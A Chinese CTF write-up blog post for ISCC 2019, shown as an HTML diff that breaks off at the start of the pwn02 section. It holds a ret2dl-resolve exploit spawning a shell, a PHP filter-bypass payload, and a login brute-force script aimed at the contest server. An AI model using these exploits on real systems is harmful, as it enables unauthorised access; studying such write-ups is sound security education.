@@ -1,0 +1,387 @@
+<!DOCTYPE html>
+<html lang=en>
+<head><meta name="generator" content="Hexo 3.9.0">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="第一周pwn1标准ret2dl，找了个脚本直接改改就ok #!/usr/bin/python#coding:utf-8from pwn import *elf = ELF(&apos;pwn01&apos;)read_plt = elf.plt[&apos;read&apos;]memcpy_plt = elf.plt[&apos;memcpy&apos;]ppp_ret = 0x08048519pop_ebp_ret = 0x0804851bleave_">
+<meta name="keywords" content="CTF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ISCC 2019 WP">
+<meta property="og:url" content="http://1nv0k3r.me/2019/05/01/ISCC-2019-WP/index.html">
+<meta property="og:site_name" content="1nv0k3r&#39;s blog">
+<meta property="og:description" content="第一周pwn1标准ret2dl，找了个脚本直接改改就ok #!/usr/bin/python#coding:utf-8from pwn import *elf = ELF(&apos;pwn01&apos;)read_plt = elf.plt[&apos;read&apos;]memcpy_plt = elf.plt[&apos;memcpy&apos;]ppp_ret = 0x08048519pop_ebp_ret = 0x0804851bleave_">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="http://1nv0k3r.me/2019/05/01/ISCC-2019-WP/2.png">
+<meta property="og:image" content="http://1nv0k3r.me/2019/05/01/ISCC-2019-WP/3.png">
+<meta property="og:image" content="http://1nv0k3r.me/2019/05/01/ISCC-2019-WP/1.png">
+<meta property="og:updated_time" content="2019-05-24T02:47:11.384Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="ISCC 2019 WP">
+<meta name="twitter:description" content="第一周pwn1标准ret2dl，找了个脚本直接改改就ok #!/usr/bin/python#coding:utf-8from pwn import *elf = ELF(&apos;pwn01&apos;)read_plt = elf.plt[&apos;read&apos;]memcpy_plt = elf.plt[&apos;memcpy&apos;]ppp_ret = 0x08048519pop_ebp_ret = 0x0804851bleave_">
+<meta name="twitter:image" content="http://1nv0k3r.me/2019/05/01/ISCC-2019-WP/2.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>ISCC 2019 WP</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tags/">tags</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2019/05/10/栈溢出攻击之ret2dl/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2019/04/23/ciscn-2019-pwn-re/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://1nv0k3r.me/2019/05/01/ISCC-2019-WP/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://1nv0k3r.me/2019/05/01/ISCC-2019-WP/&text=ISCC 2019 WP"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://1nv0k3r.me/2019/05/01/ISCC-2019-WP/&title=ISCC 2019 WP"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://1nv0k3r.me/2019/05/01/ISCC-2019-WP/&is_video=false&description=ISCC 2019 WP"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ISCC 2019 WP&body=Check out this article: http://1nv0k3r.me/2019/05/01/ISCC-2019-WP/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://1nv0k3r.me/2019/05/01/ISCC-2019-WP/&title=ISCC 2019 WP"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://1nv0k3r.me/2019/05/01/ISCC-2019-WP/&title=ISCC 2019 WP"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://1nv0k3r.me/2019/05/01/ISCC-2019-WP/&title=ISCC 2019 WP"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://1nv0k3r.me/2019/05/01/ISCC-2019-WP/&title=ISCC 2019 WP"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://1nv0k3r.me/2019/05/01/ISCC-2019-WP/&name=ISCC 2019 WP&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#第一周"><span class="toc-number">1.</span> <span class="toc-text">第一周</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pwn1"><span class="toc-number">1.1.</span> <span class="toc-text">pwn1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web1"><span class="toc-number">1.2.</span> <span class="toc-text">web1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web2"><span class="toc-number">1.3.</span> <span class="toc-text">web2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#re1"><span class="toc-number">1.4.</span> <span class="toc-text">re1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#re2"><span class="toc-number">1.5.</span> <span class="toc-text">re2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#misc-50"><span class="toc-number">1.6.</span> <span class="toc-text">misc 50</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#misc-100"><span class="toc-number">1.7.</span> <span class="toc-text">misc 100</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#misc-200"><span class="toc-number">1.8.</span> <span class="toc-text">misc 200</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#misc300"><span class="toc-number">1.9.</span> <span class="toc-text">misc300</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#misc400"><span class="toc-number">1.10.</span> <span class="toc-text">misc400</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第二周"><span class="toc-number">2.</span> <span class="toc-text">第二周</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pwn02"><span class="toc-number">2.1.</span> <span class="toc-text">pwn02</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web1-1"><span class="toc-number">2.2.</span> <span class="toc-text">web1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#re1-1"><span class="toc-number">2.3.</span> <span class="toc-text">re1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#re2-1"><span class="toc-number">2.4.</span> <span class="toc-text">re2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#re3"><span class="toc-number">2.5.</span> <span class="toc-text">re3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#misc1"><span class="toc-number">2.6.</span> <span class="toc-text">misc1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#misc2"><span class="toc-number">2.7.</span> <span class="toc-text">misc2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#welcome"><span class="toc-number">2.8.</span> <span class="toc-text">welcome</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mobile"><span class="toc-number">2.9.</span> <span class="toc-text">mobile</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第三周"><span class="toc-number">3.</span> <span class="toc-text">第三周</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#rev03"><span class="toc-number">3.1.</span> <span class="toc-text">rev03</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rev04"><span class="toc-number">3.2.</span> <span class="toc-text">rev04</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#最危险的地方就是最安全的地方"><span class="toc-number">3.3.</span> <span class="toc-text">最危险的地方就是最安全的地方</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#High起来！"><span class="toc-number">3.4.</span> <span class="toc-text">High起来！</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web5"><span class="toc-number">3.5.</span> <span class="toc-text">web5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web6"><span class="toc-number">3.6.</span> <span class="toc-text">web6</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Rev04"><span class="toc-number">3.7.</span> <span class="toc-text">Rev04</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web5-1"><span class="toc-number">3.8.</span> <span class="toc-text">web5</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        ISCC 2019 WP
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">1nv0k3r's blog</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2019-05-01T11:18:00.000Z" itemprop="datePublished">2019-05-01</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/CTF/">CTF</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="第一周"><a href="#第一周" class="headerlink" title="第一周"></a>第一周</h2><h3 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h3><p>标准ret2dl，找了个脚本直接改改就ok</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">'pwn01'</span>)</span><br><span class="line">read_plt = elf.plt[<span class="string">'read'</span>]</span><br><span class="line">memcpy_plt = elf.plt[<span class="string">'memcpy'</span>]</span><br><span class="line"></span><br><span class="line">ppp_ret = <span class="number">0x08048519</span></span><br><span class="line">pop_ebp_ret = <span class="number">0x0804851b</span></span><br><span class="line">leave_ret = <span class="number">0x080483c5</span></span><br><span class="line">stack_size = <span class="number">0x800</span></span><br><span class="line">bss_addr = <span class="number">0x0804a020</span></span><br><span class="line">base_stage = bss_addr + stack_size</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">'./pwn01'</span>)</span><br><span class="line">payload = <span class="string">'A'</span> * <span class="number">14</span> + p32(<span class="number">0x804a044</span> + <span class="number">18</span>)</span><br><span class="line">payload += p32(read_plt)</span><br><span class="line">payload += p32(ppp_ret)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(base_stage)</span><br><span class="line">payload += p32(<span class="number">100</span>)</span><br><span class="line">payload += p32(pop_ebp_ret)</span><br><span class="line">payload += p32(base_stage)</span><br><span class="line">payload += p32(leave_ret)</span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">"/bin/sh"</span></span><br><span class="line">plt_0 = <span class="number">0x080482f0</span></span><br><span class="line">rel_plt = <span class="number">0x080482b4</span></span><br><span class="line">index_offset = (base_stage + <span class="number">28</span>) - rel_plt</span><br><span class="line"></span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line"></span><br><span class="line">dynsym = <span class="number">0x080481cc</span></span><br><span class="line">dynstr = <span class="number">0x0804822c</span></span><br><span class="line"></span><br><span class="line">fake_sym_addr = base_stage + <span class="number">36</span></span><br><span class="line">align = <span class="number">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class="number">0xf</span>)</span><br><span class="line">fake_sym_addr = fake_sym_addr + align</span><br><span class="line">index_dynsym = (fake_sym_addr - dynsym) / <span class="number">0x10</span></span><br><span class="line">r_info = (index_dynsym &lt;&lt; <span class="number">8</span>) | <span class="number">0x7</span></span><br><span class="line">fake_reloc = p32(read_got) + p32(r_info)</span><br><span class="line">st_name = (fake_sym_addr + <span class="number">16</span>) - dynstr</span><br><span class="line">fake_sym = p32(st_name) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x12</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">'aaaa'</span></span><br><span class="line">payload2 += p32(plt_0)</span><br><span class="line">payload2 += p32(index_offset)</span><br><span class="line">payload2 += <span class="string">'aaaa'</span></span><br><span class="line">payload2 += p32(base_stage + <span class="number">80</span>)</span><br><span class="line">payload2 += <span class="string">'aaaa'</span></span><br><span class="line">payload2 += <span class="string">'aaaa'</span></span><br><span class="line">payload2 += fake_reloc</span><br><span class="line">payload2 += <span class="string">'a'</span> * align</span><br><span class="line">payload2 += fake_sym </span><br><span class="line">payload2 += <span class="string">"system\x00"</span></span><br><span class="line">payload2 += <span class="string">'a'</span> * (<span class="number">80</span> - len(payload2))</span><br><span class="line">payload2 += cmd + <span class="string">'\x00'</span></span><br><span class="line">payload2 += <span class="string">'a'</span> * (<span class="number">100</span> - len(payload2))</span><br><span class="line">r.send(payload2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2.7</span></span><br><span class="line"><span class="keyword">from</span> roputils <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> process</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> gdb</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> context</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">'./pwn01'</span>)</span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>)</span><br><span class="line">rop = ROP(<span class="string">'./pwn01'</span>)</span><br><span class="line">bss_base = rop.section(<span class="string">'.bss'</span>)</span><br><span class="line">buf = <span class="string">'A'</span> * <span class="number">14</span> + p32(<span class="number">0x804a044</span> + <span class="number">18</span>)</span><br><span class="line">buf += rop.call(<span class="string">'read'</span>, <span class="number">0</span>, bss_base, <span class="number">100</span>)</span><br><span class="line"><span class="comment">## used to call dl_Resolve()</span></span><br><span class="line">buf += rop.dl_resolve_call(bss_base + <span class="number">20</span>, bss_base)</span><br><span class="line">r.send(buf)</span><br><span class="line">buf = rop.string(<span class="string">'/bin/sh'</span>)</span><br><span class="line">buf += rop.fill(<span class="number">20</span>, buf)</span><br><span class="line"><span class="comment">## used to make faking data, such relocation, Symbol, Str</span></span><br><span class="line">buf += rop.dl_resolve_data(bss_base + <span class="number">20</span>, <span class="string">'system'</span>)</span><br><span class="line">buf += rop.fill(<span class="number">100</span>, buf)</span><br><span class="line">r.send(buf)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h3><p>给了源码，按题目绕过即可</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require</span> <span class="string">'flag.php'</span>;</span><br><span class="line">$value = $_GET[<span class="string">'value'</span>];</span><br><span class="line">$password = $_GET[<span class="string">'password'</span>];</span><br><span class="line">$username = <span class="string">''</span><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; count($value); ++$i) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($value[$i] &gt; <span class="number">32</span> &amp;&amp; $value[$i] &lt; <span class="number">127</span>) <span class="keyword">unset</span>($value);</span><br><span class="line">    <span class="keyword">else</span> $username .= chr($value[$i]);</span><br><span class="line">    <span class="keyword">if</span> ($username == <span class="string">'w3lc0me_To_ISCC2019'</span> &amp;&amp; intval($password) &lt; <span class="number">2333</span> &amp;&amp; intval($password + <span class="number">1</span>) &gt; <span class="number">2333</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Hello '</span>.$username.<span class="string">'!'</span>, <span class="string">'&lt;br&gt;'</span>, PHP_EOL;</span><br><span class="line">        <span class="keyword">echo</span> $flag, <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
+<p>payload:<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/index.php?value[<span class="number">0</span>]=<span class="number">375</span>&amp;value[<span class="number">1</span>]=<span class="number">307</span>&amp;value[<span class="number">2</span>]=<span class="number">364</span>&amp;value[<span class="number">3</span>]=<span class="number">355</span>&amp;value[<span class="number">4</span>]=<span class="number">304</span>&amp;value[<span class="number">5</span>]=<span class="number">365</span>&amp;value[<span class="number">6</span>]=<span class="number">357</span>&amp;value[<span class="number">7</span>]=<span class="number">351</span>&amp;value[<span class="number">8</span>]=<span class="number">340</span>&amp;value[<span class="number">9</span>]=<span class="number">367</span>&amp;value[<span class="number">10</span>]=<span class="number">351</span>&amp;value[<span class="number">11</span>]=<span class="number">329</span>&amp;value[<span class="number">12</span>]=<span class="number">339</span>&amp;value[<span class="number">13</span>]=<span class="number">323</span>&amp;value[<span class="number">14</span>]=<span class="number">323</span>&amp;value[<span class="number">15</span>]=<span class="number">306</span>&amp;value[<span class="number">16</span>]=<span class="number">304</span>&amp;value[<span class="number">17</span>]=<span class="number">305</span>&amp;value[<span class="number">18</span>]=<span class="number">313</span>&amp;password=<span class="number">0x91d</span></span><br></pre></td></tr></table></figure></p>
+<h3 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h3><p>验证码没check。。。直接置空就可以爆破了</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://39.100.83.188:8002/login.php'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">1000</span>):</span><br><span class="line">    para = &#123;</span><br><span class="line">        <span class="string">'username'</span>: <span class="string">'admin'</span>,</span><br><span class="line">        <span class="string">'pwd'</span>: str(i),</span><br><span class="line">        <span class="string">'user_code'</span>: <span class="string">''</span>,</span><br><span class="line">        <span class="string">'Login'</span>: <span class="string">'submit'</span></span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.post(url, data=para)</span><br><span class="line">    <span class="keyword">if</span> r.content.decode(<span class="string">'utf-8'</span>) != <span class="string">'密码错误'</span>:</span><br><span class="line">        print(<span class="string">"Password: "</span> + str(i))</span><br></pre></td></tr></table></figure>
+<p>密码996，啧</p>
+<h3 id="re1"><a href="#re1" class="headerlink" title="re1"></a>re1</h3><p>ida启动，程序功能是输入42，输出一段莫名其妙的字符串</p>
+<pre><code>Cipher from Bill \nSubmit without any tags\n#kdudpeh
+</code></pre><p>否则输出英文版<code>你个傻逼</code></p>
+<p>flag是sha1后的#后面字母，搞不懂出题人思路，也没看懂他们怎么做出来的，也别问我怎么做出来，打这种比赛人脉还是要有的，《情商》没事多读一读</p>
+<h3 id="re2"><a href="#re2" class="headerlink" title="re2"></a>re2</h3><p>ida打开 没见过这种形式的题，搜了一下几个关键函数名，找到了原题</p>
+<p>R写的程序，感觉逆起来难度蛮高</p>
+<p><a href="https://www.360zhijia.com/anquan/441368.html">https://www.360zhijia.com/anquan/441368.html</a></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cipher = [<span class="number">0x154</span>, <span class="number">0x180</span>, <span class="number">0x1FC</span>, <span class="number">0x1E4</span>, <span class="number">0x1F8</span>, <span class="number">0x154</span>, <span class="number">0x190</span>, <span class="number">0x1BC</span>, <span class="number">0x1BC</span>, <span class="number">0x1B8</span>, <span class="number">0x154</span>, <span class="number">0x1F8</span>, <span class="number">0x194</span>, <span class="number">0x154</span>, <span class="number">0x1B4</span>, <span class="number">0x1BC</span>, <span class="number">0x1F8</span>, <span class="number">0x154</span>, <span class="number">0x1F4</span>, <span class="number">0x188</span>, <span class="number">0x1AC</span>, <span class="number">0x1F8</span>, <span class="number">0x154</span>, <span class="number">0x18C</span>, <span class="number">0x1E4</span>, <span class="number">0x154</span>, <span class="number">0x190</span>, <span class="number">0x1BC</span>, <span class="number">0x1BC</span>, <span class="number">0x1B8</span>, <span class="number">0x1BC</span>, <span class="number">0x1B8</span>, <span class="number">0x154</span>, <span class="number">0x90</span>]</span><br><span class="line"></span><br><span class="line">cipher = <span class="string">''</span>.join(map(<span class="keyword">lambda</span> x: chr((x&gt;&gt;<span class="number">2</span>) ^ <span class="number">0xa</span>), cipher))</span><br><span class="line"><span class="keyword">print</span> cipher</span><br></pre></td></tr></table></figure>
+<h3 id="misc-50"><a href="#misc-50" class="headerlink" title="misc 50"></a>misc 50</h3><p>文件里是一段看起来是8进制的数据，直接转ASCII即可，然后用base64解一下</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">import base64</span><br><span class="line">m = &apos;0126 062 0126 0163 0142 0103 0102 0153 0142 062 065 0154 0111 0121 0157 0113 0111 0105 0132 0163 0131 0127 0143 &apos; \</span><br><span class="line">    &apos;066 0111 0105 0154 0124 0121 060 0116 067 0124 0152 0102 0146 0115 0107 065 0154 0130 062 0116 0150 0142 0154 &apos; \</span><br><span class="line">    &apos;071 0172 0144 0104 0102 0167 0130 063 0153 0167 0144 0130 060 0113&apos;</span><br><span class="line">m = m.split(&apos; &apos;)</span><br><span class="line">flag = &apos;&apos;</span><br><span class="line">for i in m:</span><br><span class="line">    flag += chr(int(i, 8))</span><br><span class="line">print(base64.b64decode(flag))</span><br></pre></td></tr></table></figure>
+<h3 id="misc-100"><a href="#misc-100" class="headerlink" title="misc 100"></a>misc 100</h3><p>PNG的LSB低位隐写，stegsolve一把梭，结果反向即为flag</p>
+<p>9102_cCsI</p>
+<h3 id="misc-200"><a href="#misc-200" class="headerlink" title="misc 200"></a>misc 200</h3><p>键盘密码</p>
+<p>wdnmd眼睛要瞎了</p>
+<pre><code>{ISCC-KEYbYHNMKJTGBNMJUYGRDXCVBMNBVCDRTGHUWSXCFEQWERTYTRFVBWSXNBVCXSWERFRFVGYHNWSXCDEMNBVCDRTGHU}
+
+{WSX IUYHNBV TRFVB TRFVB QWERTY QAZSCE EFVT YHNMKJ TGBNMJUY GRDXCVB MNBVCDRTGHU WSXCFE QWERTYTRFVBWSXNBVCXSWERFRFVGYHNWSXCDEMNBVCDRTGHU}
+
+FLAG{ISCC KEYBOARD CIPHER}
+</code></pre><h3 id="misc300"><a href="#misc300" class="headerlink" title="misc300"></a>misc300</h3><p>写个脚本把图拼起来</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="comment"># 124 * 70</span></span><br><span class="line">file = <span class="string">'./files/IMG0000'</span></span><br><span class="line"><span class="comment"># m = [[[0 for i in range(3)] for j in range(124)] for k in range(70)]</span></span><br><span class="line">image = Image.open(file + str(<span class="number">0</span>) + <span class="string">'.bmp'</span>)</span><br><span class="line">m = np.asarray(image)</span><br><span class="line">m.flags[<span class="string">'WRITEABLE'</span>] = <span class="keyword">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">9</span>):</span><br><span class="line">    image = Image.open(file + str(i) + <span class="string">'.bmp'</span>)</span><br><span class="line">    matrix = np.asarray(image)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">70</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">124</span>):</span><br><span class="line">            <span class="keyword">if</span> matrix[j][k][<span class="number">0</span>] != <span class="number">0</span> <span class="keyword">and</span> m[j][k][<span class="number">0</span>] == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">for</span> l <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">                    m[j][k][l] = matrix[j][k][l]</span><br><span class="line"></span><br><span class="line">image = Image.fromarray(m)</span><br><span class="line">image.show()</span><br></pre></td></tr></table></figure>
+<p>GIF尾部有一段</p>
+<pre><code>U2FsdGVkX19QwGkcgD0fTjZxgijRzQOGbCWALh4sRDec2w6xsY/ux53Vuj/AMZBDJ87qyZL5kAf1fmAH4Oe13Iu435bfRBuZgHpnRjTBn5+xsDHONiR3t0+Oa8yG/tOKJMNUauedvMyN4v4QKiFunw==
+</code></pre><p>解两次AES，密码是图上的ISCC</p>
+<p>WDNMD</p>
+<h3 id="misc400"><a href="#misc400" class="headerlink" title="misc400"></a>misc400</h3><p>binwalk一把梭，出来的图片每张末尾有1250的padding</p>
+<p>转成50*25的矩阵，然后十张图拼起来即可</p>
+<p>别问我怎么知道的，吾好梦中做题</p>
+<p>脚本：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> List</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="comment"># file read</span></span><br><span class="line">path = <span class="string">'./files/puzzle'</span></span><br><span class="line">paddings: List[bytes] = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    file = open(path + str(i + <span class="number">1</span>) + <span class="string">'.jpg'</span>, <span class="string">'rb'</span>)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0xd46</span>):</span><br><span class="line">        file.read(<span class="number">1</span>)</span><br><span class="line">    paddings.append(file.read(<span class="number">1250</span>))</span><br><span class="line">    file.close()</span><br><span class="line">m = [[<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">250</span>)] <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">50</span>)]  <span class="comment"># 50 * 250 matrix</span></span><br><span class="line"><span class="comment"># fill matrix</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">25</span>):</span><br><span class="line">            <span class="keyword">if</span> paddings[j][k + i * <span class="number">25</span>] == <span class="number">0</span>:</span><br><span class="line">                m[i][j * <span class="number">25</span> + k] = <span class="number">255</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                m[i][j * <span class="number">25</span> + k] = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">image = Image.fromarray(np.array(m))</span><br><span class="line">image.show()</span><br></pre></td></tr></table></figure></p>
+<h2 id="第二周"><a href="#第二周" class="headerlink" title="第二周"></a>第二周</h2><h3 id="pwn02"><a href="#pwn02" class="headerlink" title="pwn02"></a>pwn02</h3><p>堆溢出导致的fastbin attack</p>
+<p>ida反编译以后可以看到程序有3个功能，分别是malloc+gets, free和put</p>
+<p>做法蛮多的，这里用最容易的一种方法</p>
